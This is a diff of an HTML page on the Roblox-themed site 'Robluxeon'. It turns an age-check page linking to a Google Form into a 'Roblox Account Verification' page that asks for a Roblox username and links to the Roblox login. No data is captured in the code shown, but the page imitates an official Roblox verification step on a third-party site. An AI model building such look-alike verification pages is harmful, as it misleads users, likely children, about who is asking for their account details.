@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Age Check - Robluxeon</title>
+    <title>Roblox Account Verification - Robluxeon</title>
     <link rel="icon" type="image/x-icon" href="https://cdn.discordapp.com/attachments/1184597057382666301/1191017998568398898/robluxion.jpeg?ex=65a3e8f2&is=659173f2&hm=7736202198afbd9e8da778b8996a0c94aa0f09d6f020d3f622319096770fb64d&">
     <style>
         body {
@@ -50,54 +50,46 @@
         main {
             flex-grow: 1;
             padding: 20px;
-            font-family: Arial;
-            font-size: 20px;
-            font-weight: bold;
-            color: white;
-            text-align: center;
         }
 
         main h1 {
             color: Red;
+            font-size: 30px;
         }
 
-        main h2 {
-            color: red;
-        }
-
-        main img {
-            max-width: 100%;
-            height: auto;
-            margin-top: 20px;
-        }
-
-        form {
-            margin: 0 auto; /* Center the form */
-            max-width: 400px; /* Adjusted width */
-        }
-
-        input {
-            width: calc(100% - 20px); /* Adjusted width to be closer to the right side */
-            padding: 10px;
+        main label {
+            color: white;
+            font-size: 18px;
             margin-bottom: 10px;
-            box-sizing: border-box;
-        }
-
-        input ID {
+            display: block;
             text-align: center;
         }
 
-        button {
-            background-color: grey; /* dark blue */
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+        main input {
+            width: 65%; /* Adjusted width */
+            padding: 10px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            display: inline-block; /* Ensures the input doesn't go below the label */
         }
 
-        button:hover {
-            background-color: #333; /* darker blue */
+        main input[type="checkbox"] {
+            width: auto;
+            margin-right: 5px;
+        }
+
+        main a {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            background-color: #333; /* dark red */
+            border-radius: 4px;
+            display: inline-block;
+        }
+
+        main a:hover {
+            background-color: #555; /* darker red */
         }
     </style>
 </head>
@@ -120,13 +112,16 @@
     </aside>
 
     <main>
-        <h1>Age Check</h1>
-        <p>Your organization seeks to conduct an age verification check to confirm that you are above the age of 13.</p>
-        <p>Kindly complete the attached form below to verify your age.</p>
-        <!-- Insert your age check content here... -->
-        <a href="https://forms.gle/QXHEGWVWTYYn3Xfz7" target="_blank">
-            <button>Complete</button>
-        </a>
+        <h1>Roblox Account Verification</h1>
+        <label for="robloxUsername">Enter your Roblox Username:</label>
+        <input type="text" id="robloxUsername" name="robloxUsername" required>
+
+        <label for="agreeCheckbox">
+            <input type="checkbox" id="agreeCheckbox" name="agreeCheckbox" required>
+            By ticking this box, you agree to Roblox Privacy Policy
+        </label>
+
+        <a href="https://roblox.com/login" class="dashboard-button">Verify Account</a>
     </main>
 </body>
 
